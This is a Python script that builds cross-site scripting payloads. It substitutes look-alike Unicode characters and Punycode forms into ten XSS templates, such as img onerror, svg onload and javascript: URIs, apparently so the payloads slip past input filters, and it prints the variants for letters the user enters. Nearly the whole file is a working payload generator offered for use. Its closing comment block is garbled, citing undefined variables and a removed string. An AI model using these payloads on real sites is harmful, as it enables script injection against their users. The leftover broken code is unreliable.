XSS_PAYLOAD_TEMPLATES = [
    "<img src=x onerror=alert('{payload}')>",
    "<a href=\"javascript:alert('{payload}')\">Click me</a>",
    "<input value=\"{payload}\" type=\"text\">",
    "<script>var x='{payload}';</script>",
    "javascript:alert('{payload}')",
    "<div data-text=\"{payload}\">Text</div>",
    "<iframe src=\"javascript:alert('{payload}')\"></iframe>",
    "<svg onload=alert(\"{payload}\")>",
    "<body onload=alert(\"{payload}\")>",
    "<details open ontoggle=alert(\"{payload}\")>"
]

homoglyphs_map = {
    'a': ['\u0430', '\u0251', '\u03B1', '\u0101', '@', '\u0041', '\uFF41'],
    'b': ['\u042C', '\u0299', '\u0185', '\u03B2', '\uFF42'],
    'c': ['\u00A2', '\u010B', '\u0107', '\u03F2', '\u0441', '\uFF43'],
    'd': ['\u00F0', '\u010F', '\u0111', '\u0501', '\u0257', '\uFF44'],
    'e': ['\u0435', '\u025B', '\u0117', '\u0113', '\u20AC', '\uFF45'],
    'f': ['\u0192', '\u025F', '\uFF46'],
    'g': ['\u0260', '\u0121', '\u011D', '\uFF47'],
    'h': ['\u04BB', '\u0125', '\u0266', '\uFF48'],
    'i': ['\u0456', '\u0269', '\u012B', '\uFF49', '1', '!'],
    'j': ['\u0575', '\u029D', '\u0135', '\uFF4A'],
    'k': ['\u043A', '\u0137', '\uFF4B'],
    'l': ['\u013A', '\u013C', '\u013E', '\u026D', '\uFF4C', '|'],
    'm': ['\u0271', '\u043C', '\u0141', '\uFF4D'],
    'n': ['\u00F1', '\u014B', '\u0144', '\u03B7', '\u0273', '\uFF4E'],
    'o': ['\u0D20', '\u00F2', '\u00F3', '\u00F4', '\u00F5', '\u00F6', '\u014D', '\u014F', '\u0151', '\u03BF', '\u043E', '\uFF4F', '0'],
    'p': ['\u00DE', '\u01A5', '\u03C1', '\u0440', '\uFF50'],
    'q': ['\u02A0', '\uFF51'],
    'r': ['\u027C', '\u0155', '\u0159', '\uFF52'],
    's': ['\u00A7', '\u015B', '\u015D', '\u0161', '\u023F', '\u0282', '\uFF53', '$', '5'],
    't': ['\u0165', '\u0163', '\u021B', '\u03C4', '\uFF54', '+'],
    'u': ['\u00B5', '\u016B', '\u016F', '\u0171', '\u03C5', '\u0446', '\uFF55'],
    'v': ['\uFF56'], # Note: The 'specialists' seems like a typo in the original, should be a char. Assuming it's a placeholder or error.
    'w': ['\u0175', '\u0448', '\u0428', '\uFF57'],
    'x': ['\u0445', '\u0425', '\uFF58'],
    'y': ['\u00A5', '\u0177', '\u03BB', '\u0443', '\uFF59'],
    'z': ['\u017A', '\u017C', '\u017E', '\u0290', '\u0291', '\uFF5A']
}

def encode_punycode(text):
    """Encodes a string to Punycode."""
    try:
        return text.encode('punycode').decode('utf-8')
    except UnicodeEncodeError:
        return None

def generate_xss_payloads(letter, payload_templates):
    letter = letter.lower()
    glyphs = homoglyphs_map.get(letter)

    if not glyphs:
        print(f"No homoglyphs found for letter: '{letter}'.") # Made message slightly more specific
        return []

    generated_payloads = []
    for template in payload_templates:
        for glyph in glyphs:
            payload_with_glyph = template.replace('{payload}', glyph)
            generated_payloads.append(payload_with_glyph)

            punycode_variant = encode_punycode(glyph)
            if punycode_variant:
                payload_with_punycode = template.replace('{payload}', punycode_variant)
                generated_payloads.append(payload_with_punycode)

    return generated_payloads

if __name__ == '__main__':
    user_input_str = input("Enter a letter (or multiple letters, comma-separated) to generate XSS payloads for: ").strip()

    if not user_input_str:
        print("No input provided.")
    else:
        letters_to_process = [l.strip() for l in user_input_str.split(',')]

        first_payload_generated = False # To manage spacing between outputs for different letters

        for letter_input in letters_to_process:
            if not letter_input: # Handle cases like "a, ,b" -> skip empty string
                continue

            if not (len(letter_input) == 1 and letter_input.isalpha()):
                print(f"❗ Invalid input: '{letter_input}'. Please enter single alphabetic letters.")
                continue

            if first_payload_generated:
                print() # Add a newline for separation if we've already printed payloads for a previous letter

            payloads = generate_xss_payloads(letter_input, XSS_PAYLOAD_TEMPLATES)

            if payloads:
                print(f"--- Payloads for letter: '{letter_input}' ---")
                for payload in payloads:
                    print(payload)
                first_payload_generated = True
            # If payloads list is empty, generate_xss_payloads already printed a message.
            # We could add an else here if we want to print "No payloads generated for 'x'"
            # but the current requirement is to rely on the message from generate_xss_payloads.
            # else:
            #    print(f"No payloads generated for '{letter_input}' (this message is from main).")

    # A note on the 'v' entry in homoglyphs_map:
    # The entry for 'v': ['\uFF56'] had a typo (the removed 'specialists' string).
    # The current code handles encode_punycode returning None for this.
    # This comment can be removed if not needed for script users.
    # For example, to check it during execution:
    # if 'v' in homoglyphs_map: # Check if 'v' is still in the map.
    #     print("\\n--- Note on 'v' in homoglyphs_map ---")
    #     # The problematic glyph was removed. You might want to test homoglyphs_map['v'] directly.
    #     # For example, print(homoglyphs_map['v'])
    #     pass # Original problematic glyph check is no longer relevant here.
    #     if encoded_problematic_glyph:
    #         print(f"Punycode for '{problematic_glyph}': {encoded_problematic_glyph}")
    #     else:
    #         print(f"Punycode for '{problematic_glyph}' could not be generated (as expected for this multi-char string).")
```
